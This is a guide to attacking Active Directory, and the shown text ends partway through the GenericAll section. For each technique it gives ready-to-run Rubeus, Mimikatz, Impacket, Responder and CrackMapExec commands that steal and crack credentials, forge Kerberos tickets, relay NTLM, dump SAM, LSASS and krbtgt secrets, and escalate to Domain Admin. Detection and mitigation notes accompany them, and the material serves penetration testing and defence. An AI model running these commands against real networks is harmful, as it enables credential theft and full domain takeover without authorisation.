# Active Directory Attacks - Comprehensive Guide

---

## Kerberos Attacks

### Kerberoasting
**MITRE ATT&CK**: T1558.003

**Description**: Extract service account credentials by requesting TGS tickets for SPNs and cracking offline.

**Prerequisites**:
- Valid domain credentials
- Service accounts with SPNs registered

**Attack Execution**:

**Windows (Rubeus)**:
```powershell
# Enumerate SPNs
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Target specific user
.\Rubeus.exe kerberoast /user:svc_sql /outfile:sql_hash.txt

# Use alternate credentials
.\Rubeus.exe kerberoast /creduser:DOMAIN\user /credpassword:Password123

# RC4 downgrade attack (opsec consideration)
.\Rubeus.exe kerberoast /tgtdeleg /rc4opsec

# AES encryption support (stealthier)
.\Rubeus.exe kerberoast /nowrap
```

**Windows (PowerView)**:
```powershell
# Find kerberoastable users
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname

# Request tickets
Request-SPNTicket -SPN "MSSQLSvc/sql01.corp.local"

# Export all tickets
Get-DomainUser -SPN | Get-DomainSPNTicket | Export-Csv tickets.csv
```

**Linux (Impacket)**:
```bash
# GetUserSPNs
impacket-GetUserSPNs 'DOMAIN/user:password' -dc-ip 10.10.10.10 -request

# Output to hashcat format
impacket-GetUserSPNs 'DOMAIN/user:password' -dc-ip 10.10.10.10 -request -outputfile hashes.txt

# Use Kerberos authentication
impacket-GetUserSPNs 'DOMAIN/user' -k -no-pass -dc-ip 10.10.10.10 -request

# Target specific SPN
impacket-GetUserSPNs 'DOMAIN/user:password' -dc-ip 10.10.10.10 -request-user svc_sql
```

**Cracking**:
```bash
# Hashcat (mode 13100 for TGS-REP)
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule

# John the Ripper
john --wordlist=wordlist.txt hashes.txt
```

**Detection Indicators**:
- Event ID 4769: Kerberos TGS request (abnormal ticket encryption type RC4 vs AES)
- Multiple TGS requests from single user in short timeframe
- TGS requests for accounts with high privilege SPNs
- Ticket encryption downgrade from AES to RC4

**Mitigation**:
- Use managed service accounts (gMSA)
- Enforce strong passwords (25+ characters)
- Disable RC4 encryption
- Monitor Event ID 4769 with filters

---

### AS-REP Roasting
**MITRE ATT&CK**: T1558.004

**Description**: Extract password hashes from accounts with "Do not require Kerberos preauthentication" enabled.

**Prerequisites**:
- Domain user enumeration capability
- Accounts with DONT_REQ_PREAUTH flag set

**Attack Execution**:

**Windows (Rubeus)**:
```powershell
# Enumerate and roast AS-REP roastable users
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt

# Target specific user
.\Rubeus.exe asreproast /user:testuser /outfile:hash.txt

# Use alternate domain
.\Rubeus.exe asreproast /domain:corp.local /dc:dc01.corp.local

# Format for Hashcat
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

**Windows (PowerView)**:
```powershell
# Find AS-REP roastable users
Get-DomainUser -PreauthNotRequired | Select samaccountname,userprincipalname

# Enumerate with LDAP
([adsisearcher]"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))").FindAll()
```

**Linux (Impacket)**:
```bash
# GetNPUsers - enumerate and extract
impacket-GetNPUsers 'DOMAIN/' -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat -outputfile hashes.txt

# With credentials for enumeration
impacket-GetNPUsers 'DOMAIN/user:password' -dc-ip 10.10.10.10 -request

# No credentials (user enumeration)
impacket-GetNPUsers 'DOMAIN/' -no-pass -usersfile users.txt -dc-ip 10.10.10.10
```

**Cracking**:
```bash
# Hashcat (mode 18200 for AS-REP)
hashcat -m 18200 asrep_hashes.txt wordlist.txt -r rules/best64.rule

# John
john --wordlist=wordlist.txt asrep_hashes.txt
```

**Detection Indicators**:
- Event ID 4768: Kerberos AS request with pre-auth type 0
- Accounts with userAccountControl containing DONT_REQ_PREAUTH flag
- Multiple failed AS-REQ attempts from unknown hosts

**Mitigation**:
- Audit and remove DONT_REQ_PREAUTH flag from accounts
- Strong password policy enforcement
- Monitor accounts with this setting enabled

---

### Golden Ticket Attack
**MITRE ATT&CK**: T1558.001

**Description**: Forge Kerberos TGT using krbtgt account NTLM hash to gain persistent domain admin access.

**Prerequisites**:
- krbtgt NTLM hash or AES key
- Domain SID
- Domain name

**Attack Execution**:

**Windows (Mimikatz)**:
```powershell
# Extract krbtgt hash (requires Domain Admin)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Create golden ticket
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:NTLMHASH /user:Administrator /id:500 /ptt

# Create with custom groups
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:NTLMHASH /user:fakeadmin /groups:512,513,518,519,520 /ptt

# Create with AES256 key (stealthier)
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /aes256:AES256KEY /user:Administrator /ptt

# Specify ticket lifetime (default 10 years)
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:NTLMHASH /user:Administrator /startoffset:-10 /endin:600 /renewmax:10080 /ptt
```

**Linux (Impacket)**:
```bash
# Create golden ticket
impacket-ticketer -nthash KRBTGTHASH -domain-sid S-1-5-21-... -domain corp.local Administrator

# Create and save to file
impacket-ticketer -nthash KRBTGTHASH -domain-sid S-1-5-21-... -domain corp.local -user-id 500 Administrator -groups 512,513,518,519,520

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec corp.local/Administrator@dc01.corp.local -k -no-pass
```

**Using Golden Ticket**:
```powershell
# Verify ticket injection
klist

# Access resources
dir \\dc01\c$
Enter-PSSession -ComputerName dc01
```

**Detection Indicators**:
- Event ID 4624: Logon with unusual account behavior
- Event ID 4672: Special privileges assigned to new logon
- TGT with unusual lifetime (10 years default)
- Account logon from impossible locations/times
- TGT requests without corresponding AS-REQ (Event ID 4768)
- Tickets with mismatched encryption types

**Mitigation**:
- Reset krbtgt password twice (wait 10 hours between)
- Implement regular krbtgt rotation (annually)
- Monitor for ticket anomalies
- Use SIEM correlation for logon patterns

---

### Silver Ticket Attack
**MITRE ATT&CK**: T1558.002

**Description**: Forge TGS tickets for specific services using service account NTLM hash.

**Prerequisites**:
- Service account NTLM hash or AES key
- Domain SID
- Target SPN

**Attack Execution**:

**Windows (Mimikatz)**:
```powershell
# Create silver ticket for CIFS
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:server01.corp.local /service:cifs /rc4:NTLMHASH /user:Administrator /ptt

# Create for HTTP service
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:web01.corp.local /service:http /rc4:NTLMHASH /user:Administrator /ptt

# Create for MSSQL
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:sql01.corp.local /service:mssqlsvc /rc4:NTLMHASH /user:Administrator /ptt

# Create for LDAP (DCSync capability)
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:dc01.corp.local /service:ldap /rc4:NTLMHASH /user:Administrator /ptt

# Create for HOST (scheduled tasks, WMI)
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:server01.corp.local /service:host /rc4:NTLMHASH /user:Administrator /ptt

# AES256 key (stealthier)
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:server01.corp.local /service:cifs /aes256:AES256KEY /user:Administrator /ptt
```

**Linux (Impacket)**:
```bash
# Create silver ticket
impacket-ticketer -nthash NTLMHASH -domain-sid S-1-5-21-... -domain corp.local -spn cifs/server01.corp.local Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass corp.local/Administrator@server01.corp.local
```

**Common Service Types**:
- **CIFS**: File share access
- **HTTP**: Web applications, WinRM
- **LDAP**: Directory queries, DCSync
- **HOST**: Scheduled tasks, WMI, PowerShell Remoting
- **MSSQLSVC**: SQL Server access
- **TERMSRV**: RDP access
- **WSMAN**: WinRM/PowerShell Remoting

**Detection Indicators**:
- Event ID 4624: Account logon without prior TGT request
- Event ID 4634: Logoff event missing
- TGS without corresponding TGT in logs
- Service tickets with anomalous encryption
- Accounts accessing services they don't normally use

**Mitigation**:
- Regular password rotation for service accounts
- Use managed service accounts (gMSA/sMSA)
- Monitor for TGS usage without TGT
- Implement honeypot service accounts

---

### Diamond Ticket Attack
**MITRE ATT&CK**: T1558.001

**Description**: Modify existing TGT instead of forging from scratch, making detection harder than golden tickets.

**Prerequisites**:
- krbtgt AES key
- Valid user TGT
- Domain information

**Attack Execution**:

**Windows (Rubeus)**:
```powershell
# Create diamond ticket
.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:AES256KEY /nowrap

# Specify custom PAC
.\Rubeus.exe diamond /tgtdeleg /ticketuser:targetuser /ticketuserid:1234 /groups:512,513,518,519,520 /krbkey:AES256KEY

# Use existing TGT
.\Rubeus.exe diamond /tgt:BASE64TICKET /ticketuser:Administrator /krbkey:AES256KEY /ptt
```

**Advantages over Golden Ticket**:
- Contains valid PAC structure from real DC
- Harder to detect with signature validation
- Bypasses some golden ticket detection mechanisms
- Uses legitimate TGT as template

**Detection Indicators**:
- Similar to golden tickets but harder to detect
- Unusual privilege escalation in tickets
- TGT modifications in short timeframe
- Group membership inconsistencies

---

### Bronze Bit Attack (CVE-2020-17049)
**MITRE ATT&CK**: T1558

**Description**: Exploit Kerberos delegation by forging S4U2Self service tickets with forwardable flag.

**Prerequisites**:
- Service account with constrained delegation
- Service account credentials

**Attack Execution**:

**Windows (Rubeus)**:
```powershell
# Perform bronze bit attack
.\Rubeus.exe s4u /user:svc_account /rc4:NTLMHASH /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /bronzebit /ptt

# With AES key
.\Rubeus.exe s4u /user:svc_account /aes256:AES256KEY /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /bronzebit /ptt
```

**Detection Indicators**:
- Event ID 4769: TGS request with forwardable flag set inappropriately
- Service tickets with modified flags
- Constrained delegation usage anomalies

**Mitigation**:
- Apply patch KB4598347
- Monitor constrained delegation configurations
- Limit service accounts with delegation rights

---

### UnPAC the Hash
**MITRE ATT&CK**: T1550.003

**Description**: Obtain TGT using only NTLM hash without needing AES keys, bypassing pre-authentication.

**Prerequisites**:
- User NTLM hash
- Network access to DC

**Attack Execution**:

**Linux (Impacket)**:
```bash
# Perform UnPAC the hash attack
impacket-getTGT -dc-ip 10.10.10.10 -hashes :NTLMHASH corp.local/user

# Use obtained TGT
export KRB5CCNAME=user.ccache
impacket-psexec corp.local/user@target.corp.local -k -no-pass
```

**Detection Indicators**:
- Event ID 4768: AS-REQ with unusual pre-authentication types
- NTLM authentication followed by Kerberos usage
- Abnormal authentication patterns

---

### Kerberos Skeleton Key
**MITRE ATT&CK**: T1556.004

**Description**: Patch LSASS on Domain Controller to accept master password for any account.

**Prerequisites**:
- Domain Admin or equivalent on DC
- Physical/remote access to DC

**Attack Execution**:

**Windows (Mimikatz)**:
```powershell
# Install skeleton key (default password: mimikatz)
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Use skeleton key to authenticate
net use \\dc01\c$ /user:Administrator@corp.local mimikatz
```

**Detection Indicators**:
- Event ID 4673: Sensitive privilege use
- Event ID 7045: Service installation (Mimikatz driver)
- LSASS memory modifications
- System call hooks detected
- Unusual authentication success with wrong password

**Mitigation**:
- Enable LSA protection
- Use Credential Guard
- Monitor LSASS integrity
- Require smart card authentication for privileged accounts

---

## NTLM Attacks

### NTLM Relay Attack
**MITRE ATT&CK**: T1557.001

**Description**: Intercept and relay NTLM authentication to access resources without cracking passwords.

**Prerequisites**:
- Man-in-the-middle position or SMB signing disabled
- Target without SMB signing or EPA

**Attack Execution**:

**Linux (Impacket ntlmrelayx)**:
```bash
# Basic relay to SMB
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay to dump SAM
impacket-ntlmrelayx -tf targets.txt -smb2support -c "reg save HKLM\SAM C:\sam.save"

# Relay to execute command
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# Relay to LDAP for privilege escalation
impacket-ntlmrelayx -t ldap://dc01.corp.local --escalate-user lowpriv

# Relay to LDAPS with shadow credentials
impacket-ntlmrelayx -t ldaps://dc01.corp.local --shadow-credentials --shadow-target 'DC01$'

# Relay to HTTP/HTTPS
impacket-ntlmrelayx -t https://exchange.corp.local/EWS -smb2support

# Relay with socks proxy
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# Interactive shell on relay
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# Dump LSASS
impacket-ntlmrelayx -tf targets.txt -smb2support --dump-lsass

# Add computer account (for RBCD)
impacket-ntlmrelayx -t ldap://dc01.corp.local --add-computer
```

**Capture Traffic for Relay**:
```bash
# Using Responder
responder -I eth0 -v

# Disable Responder SMB/HTTP servers for relay
responder -I eth0 -v -r -d

# Combine with ntlmrelayx
# Terminal 1:
responder -I eth0 -v -r -d

# Terminal 2:
impacket-ntlmrelayx -tf targets.txt -smb2support
```

**Windows (Inveigh)**:
```powershell
# Start Inveigh relay
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -HTTP Y -Proxy Y

# Relay specific
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -HTTP Y -SMBRelay Y -SMBRelayTarget 10.10.10.50
```

**Coercion Techniques for Relay**:

**PetitPotam (CVE-2021-36942)**:
```bash
# Coerce authentication from DC
python3 PetitPotam.py -d corp.local -u user -p password attacker@80/test dc01.corp.local

# Relay to ADCS for certificate
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs
```

**PrinterBug (SpoolSample)**:
```bash
# Coerce DC authentication
python3 dementor.py -d corp.local -u user -p password attacker_ip dc01.corp.local

# Use with ntlmrelayx
impacket-ntlmrelayx -t ldap://dc01.corp.local --escalate-user lowpriv
```

**DFSCoerce**:
```bash
python3 dfscoerce.py -d corp.local -u user -p password attacker_ip dc01.corp.local
```

**Detection Indicators**:
- Event ID 4624: Logon Type 3 from unexpected sources
- Multiple authentication attempts from same source IP
- Unusual NTLM authentication patterns
- SMB sessions without prior authentication
- Event ID 5140: Network share access with relay characteristics

**Mitigation**:
- Enable SMB signing on all systems
- Disable NTLM authentication (use Kerberos)
- Enable LDAP signing and channel binding
- Enable EPA (Extended Protection for Authentication)
- Network segmentation
- Disable LLMNR and NetBIOS-NS

---

### Pass-the-Hash (PtH)
**MITRE ATT&CK**: T1550.002

**Description**: Authenticate using NTLM hash without needing plaintext password.

**Prerequisites**:
- NTLM hash of target account
- SMB access to target

**Attack Execution**:

**Linux (Impacket)**:
```bash
# PSExec with hash
impacket-psexec -hashes :NTLMHASH DOMAIN/user@target.corp.local

# WMIExec (stealthier, no service creation)
impacket-wmiexec -hashes :NTLMHASH DOMAIN/user@target.corp.local

# SMBExec
impacket-smbexec -hashes :NTLMHASH DOMAIN/user@target.corp.local

# AtExec (scheduled task)
impacket-atexec -hashes :NTLMHASH DOMAIN/user@target.corp.local "whoami"

# DComExec (DCOM execution)
impacket-dcomexec -hashes :NTLMHASH DOMAIN/user@target.corp.local

# SMB client access
impacket-smbclient -hashes :NTLMHASH DOMAIN/user@target.corp.local

# Secretsdump
impacket-secretsdump -hashes :NTLMHASH DOMAIN/user@target.corp.local
```

**Windows (Mimikatz)**:
```powershell
# Pass the hash
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:NTLMHASH /run:powershell.exe

# Pass the hash with AES (Overpass-the-hash)
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /aes256:AES256KEY /run:powershell.exe
```

**Windows (Invoke-TheHash)**:
```powershell
# SMBExec
Invoke-SMBExec -Target 10.10.10.50 -Domain corp.local -Username Administrator -Hash NTLMHASH -Command "whoami" -Verbose

# WMIExec
Invoke-WMIExec -Target 10.10.10.50 -Domain corp.local -Username Administrator -Hash NTLMHASH -Command "whoami"
```

**CrackMapExec**:
```bash
# Execute command
crackmapexec smb 10.10.10.0/24 -u Administrator -H NTLMHASH -x "whoami"

# Dump SAM
crackmapexec smb 10.10.10.50 -u Administrator -H NTLMHASH --sam

# Dump LSA secrets
crackmapexec smb 10.10.10.50 -u Administrator -H NTLMHASH --lsa

# Spider shares
crackmapexec smb 10.10.10.50 -u Administrator -H NTLMHASH --spider C$ --pattern password
```

**Detection Indicators**:
- Event ID 4624: Logon Type 3 with NTLM
- Event ID 4648: Explicit credential use
- Lateral movement without password changes
- Same NTLM hash used from multiple sources

**Mitigation**:
- Disable NTLM authentication
- Use Credential Guard
- Implement LAPS for local admin passwords
- Privileged Access Workstations (PAWs)

---

### Overpass-the-Hash (Pass-the-Key)
**MITRE ATT&CK**: T1550.002

**Description**: Request Kerberos TGT using NTLM hash or AES keys.

**Prerequisites**:
- NTLM hash or AES keys
- Network access to DC

**Attack Execution**:

**Windows (Rubeus)**:
```powershell
# Request TGT with NTLM hash
.\Rubeus.exe asktgt /user:Administrator /domain:corp.local /rc4:NTLMHASH /ptt

# Request TGT with AES256 key
.\Rubeus.exe asktgt /user:Administrator /domain:corp.local /aes256:AES256KEY /ptt

# Request TGT and save to file
.\Rubeus.exe asktgt /user:Administrator /domain:corp.local /rc4:NTLMHASH /outfile:ticket.kirbi

# Request TGT with no preauth (if disabled)
.\Rubeus.exe asktgt /user:testuser /domain:corp.local /enctype:rc4 /outfile:ticket.kirbi
```

**Windows (Mimikatz)**:
```powershell
# Overpass the hash with RC4
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:NTLMHASH /run:powershell.exe

# Overpass the hash with AES256
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /aes256:AES256KEY /run:powershell.exe
```

**Detection Indicators**:
- Event ID 4768: Kerberos TGT request with unusual encryption
- TGT requests from processes not typical (non-lsass)
- RC4 encryption when AES is standard

**Mitigation**:
- Disable RC4 encryption in Kerberos
- Monitor for encryption type downgrades
- Credential Guard implementation

---

### NTLM Downgrade Attack
**MITRE ATT&CK**: T1557

**Description**: Force downgrade from NTLMv2 to NTLMv1 or even LM for easier cracking.

**Attack Execution**:

**Responder with Downgrade**:
```bash
# Force NTLMv1
responder -I eth0 --lm --disable-ess

# Capture and relay NTLMv1
responder -I eth0 -v --lm
```

**Crack NTLMv1**:
```bash
# Hashcat mode 5500/5600
hashcat -m 5500 ntlmv1_hash.txt wordlist.txt
```

**Detection Indicators**:
- Event ID 4624: Authentication with NTLMv1
- Registry changes to LmCompatibilityLevel
- Unexpected authentication protocol downgrades

**Mitigation**:
- Disable NTLMv1 via GPO
- Set LmCompatibilityLevel to 5 (NTLMv2 only)
- Monitor authentication protocols

---

## Delegation Attacks

### Unconstrained Delegation
**MITRE ATT&CK**: T1558

**Description**: Abuse servers with unconstrained delegation to capture TGTs from connecting users.

**Prerequisites**:
- Identify systems with TRUSTED_FOR_DELEGATION flag
- Compromise system with unconstrained delegation

**Enumeration**:

**Windows (PowerView)**:
```powershell
# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained | Select name,dnshostname

# Find users with unconstrained delegation (rare, dangerous)
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```

**Linux**:
```bash
# Using ldapsearch
ldapsearch -x -H ldap://dc01.corp.local -D "user@corp.local" -w password -b "DC=corp,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" name

# CrackMapExec
crackmapexec ldap 10.10.10.10 -u user -p password --trusted-for-delegation
```

**Attack Execution**:

**Windows (Rubeus)**:
```powershell
# Monitor for new TGTs
.\Rubeus.exe monitor /interval:5 /nowrap

# Extract TGTs from LSASS
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x123456 /nowrap

# Coerce authentication and capture (combine with PrinterBug)
# On compromised server with unconstrained delegation:
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap

# Trigger SpoolService bug to coerce DC authentication
.\SpoolSample.exe dc01.corp.local unconstrained-server.corp.local
```

**Linux (Impacket)**:
```bash
# Monitor and extract tickets
impacket-ticketer -nthash COMPUTERHASH -domain-sid S-1-5-21-... -domain corp.local computer$

# After coercion, use captured TGT
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass corp.local/dc01\$@dc01.corp.local
```

**Detection Indicators**:
- Event ID 4624: Delegation logon (Type 3 with delegation)
- Event ID 4648: Logon with explicit credentials
- Unusual accounts accessing delegation-enabled systems
- TGT extractions from memory

**Mitigation**:
- Minimize systems with unconstrained delegation
- Use "Account is sensitive and cannot be delegated" flag for privileged accounts
- Protected Users security group
- Implement tiered admin model

---

### Constrained Delegation
**MITRE ATT&CK**: T1558

**Description**: Abuse S4U2Proxy to impersonate users to specific services.

**Prerequisites**:
- Compromise account with constrained delegation configured
- msDS-AllowedToDelegateTo attribute populated

**Enumeration**:

**Windows (PowerView)**:
```powershell
# Find computers with constrained delegation
Get-DomainComputer -TrustedToAuth | Select name,msds-allowedtodelegateto

# Find users with constrained delegation
Get-DomainUser -TrustedToAuth | Select name,msds-allowedtodelegateto
```

**Linux**:
```bash
# Using ldapsearch
ldapsearch -x -H ldap://dc01.corp.local -D "user@corp.local" -w password -b "DC=corp,DC=local" "msDS-AllowedToDelegateTo=*" name msDS-AllowedToDelegateTo

# BloodHound query
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) WHERE u.unconstraineddelegation = false AND u.allowedtodelegate IS NOT NULL RETURN p
```

**Attack Execution**:

**Windows (Rubeus)**:
```powershell
# S4U attack with TGT
.\Rubeus.exe s4u /user:svc_sql /rc4:NTLMHASH /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /ptt

# S4U with AES key
.\Rubeus.exe s4u /user:svc_sql /aes256:AES256KEY /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /ptt

# S4U with existing TGT
.\Rubeus.exe s4u /ticket:BASE64TICKET /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /ptt

# Alternate service (protocol transition)
.\Rubeus.exe s4u /user:svc_sql /rc4:NTLMHASH /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /altservice:http,wsman /ptt

# S4U2Self only (get forwardable ticket)
.\Rubeus.exe s4u /user:svc_sql /rc4:NTLMHASH /impersonateuser:Administrator /self /ptt
```

**Linux (Impacket)**:
```bash
# Get Service Ticket via S4U
impacket-getST -spn cifs/target.corp.local -impersonate Administrator -dc-ip 10.10.10.10 corp.local/svc_sql:password

# With NTLM hash
impacket-getST -spn cifs/target.corp.local -impersonate Administrator -hashes :NTLMHASH -dc-ip 10.10.10.10 corp.local/svc_sql

# Use obtained ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@target.corp.local
```

**Protocol Transition Abuse**:
```powershell
# If TRUSTED_TO_AUTH_FOR_DELEGATION is set, can use S4U2Self for any user
.\Rubeus.exe s4u /user:svc_web /rc4:NTLMHASH /impersonateuser:Administrator /msdsspn:http/webapp.corp.local /ptt

# Then transition to other services
.\Rubeus.exe s4u /user:svc_web /rc4:NTLMHASH /impersonateuser:Administrator /msdsspn:http/webapp.corp.local /altservice:cifs,ldap,host /ptt
```

**Detection Indicators**:
- Event ID 4769: TGS request with delegation flags
- Service ticket requests from unexpected accounts
- S4U2Self/S4U2Proxy events (Event ID 4769 with service name same as requesting account)

**Mitigation**:
- Limit accounts with delegation privileges
- Use "Account is sensitive" flag
- Monitor delegation configurations
- Regular audits of msDS-AllowedToDelegateTo

---

### Resource-Based Constrained Delegation (RBCD)
**MITRE ATT&CK**: T1484.001

**Description**: Configure delegation on target resource by modifying msDS-AllowedToActOnBehalfOfOtherIdentity attribute.

**Prerequisites**:
- WriteProperty rights on target computer object (or GenericAll, GenericWrite)
- Ability to create/control computer account or user with SPN

**Enumeration**:

**Windows (PowerView)**:
```powershell
# Find computers where current user has write permissions
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "CurrentUser" -and $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll"}

# Check existing RBCD configurations
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "msDS-AllowedToActOnBehalfOfOtherIdentity"}
```

**Attack Execution**:

**Windows (PowerMad + Rubeus)**:
```powershell
# 1. Create new computer account (if MachineAccountQuota allows)
Import-Module Powermad.ps1
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# 2. Configure RBCD on target
Import-Module PowerView.ps1
$ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TARGET01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 3. Perform S4U attack
.\Rubeus.exe s4u /user:FAKE01$ /rc4:NTLMHASH /impersonateuser:Administrator /msdsspn:cifs/target01.corp.local /ptt

# 4. Access target
dir \\target01.corp.local\c$
```

**Linux (Impacket)**:
```bash
# 1. Add computer account
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Password123!' -dc-ip 10.10.10.10 corp.local/user:password

# 2. Configure RBCD
python3 rbcd.py -dc-ip 10.10.10.10 -t TARGET01 -f 'FAKE01' -action write corp.local/user:password

# 3. Get service ticket
impacket-getST -spn cifs/target01.corp.local -impersonate Administrator -dc-ip 10.10.10.10 'corp.local/FAKE01$:Password123!'

# 4. Use ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@target01.corp.local
```

**Alternative Tools**:

**StandIn (Windows)**:
```powershell
# Configure RBCD
.\StandIn.exe --computer TARGET01 --sid S-1-5-21-...-FAKE01$

# Remove RBCD
.\StandIn.exe --computer TARGET01 --remove --sid S-1-5-21-...-FAKE01$
```

**Detection Indicators**:
- Event ID 4742: Computer account modified (msDS-AllowedToActOnBehalfOfOtherIdentity)
- Event ID 4741: Computer account created
- Unusual computer account creations
- S4U2Self requests from new/suspicious computer accounts

**Mitigation**:
- Set MachineAccountQuota to 0
- Monitor msDS-AllowedToActOnBehalfOfOtherIdentity changes
- Restrict computer account creation privileges
- Regular ACL audits

---

### S4U2Self Abuse
**MITRE ATT&CK**: T1558

**Description**: Request service ticket to self on behalf of any user (if TRUSTED_TO_AUTH_FOR_DELEGATION).

**Prerequisites**:
- Account with TRUSTED_TO_AUTH_FOR_DELEGATION flag
- Account credentials

**Attack Execution**:

**Windows (Rubeus)**:
```powershell
# S4U2Self to get forwardable ticket for any user
.\Rubeus.exe s4u /user:svc_account /rc4:NTLMHASH /impersonateuser:Administrator /self /ptt

# Then use for additional attacks
.\Rubeus.exe s4u /user:svc_account /rc4:NTLMHASH /impersonateuser:Administrator /self /altservice:cifs/target.corp.local /ptt
```

**Detection Indicators**:
- Event ID 4769: Service ticket request where service name = requesting account
- TRUSTED_TO_AUTH_FOR_DELEGATION accounts making unusual S4U requests

---

## ACL/Permission Abuse

### GenericAll Abuse
**MITRE ATT&CK**: T1222.001

**Description**: Full control over AD object - can modify any attribute, reset passwords, add to groups.

**Enumeration**:

**Windows (PowerView)**:
```powershell
# Find objects where current user has GenericAll
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}

# Specific target
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}

# Check if current user can abuse
Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "CurrentUser"}
```

**Linux (BloodHound)**:
```bash
# Run SharpHound
./SharpHound.exe -c All --zipfilename bloodhound.zip

# Query in BloodHound
MATCH p=(u:User)-[r:GenericAll]->(c:Computer) RETURN p
MATCH p=(g:Group)-[r:GenericAll]->(u:User) RETURN p
```

**Attack Execution**:

**Force Password Change**:
```powershell
# Windows
net user targetuser NewPassword123! /domain

# PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)

# Linux (Impacket)
impacket-changepasswd corp.local/targetuser:oldpass@dc01.corp.local -newpass NewPassword123!

# Using LDAP
ldapmodify -x -H ldap://dc01.corp.local -D "attacker@corp.local" -w password <<EOF
dn: CN=TargetUser,CN=Users,DC=corp,DC=local
changetype: modify
replace: unicodePwd
unicodePwd::$(echo -n '"NewPassword123!"' | iconv -t UTF-16LE | base64)
EOF
```

**Add to Group**:
```powershell
# Windows
net group "Domain Admins" targetuser /add /domain

# PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members targetuser

# Linux (Impacket)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Password123!' corp.local/user:password
net rpc group addmem "Domain Admins" targetuser -U corp.local/attacker%password -S dc01.corp.local
```

**Targeted Kerberoasting (Add SPN)**:
```powershell
# PowerView
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/targetuser'}

# Kerberoast
.\Rubeus.exe kerberoast /user:targetuser

# Clean up
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

**Shadow Credentials (if ADCS available)**:
```bash
# Linux (pywhisker)
python3 pywhisker.py -d corp.local -u attacker -p password -t targetuser --action add

# Authenticate with certificate
python3 gettgtpkinit.py -cert-pfx cert.pfx -dc-ip 10.10.10.10 corp.local/targetuser targetuser.ccache

# Get NTLM hash
python3 getnthash.py -key AS-REP-KEY corp.local/targetuser
```

**Detection Indicators**:
- Event ID 4738: User account changed
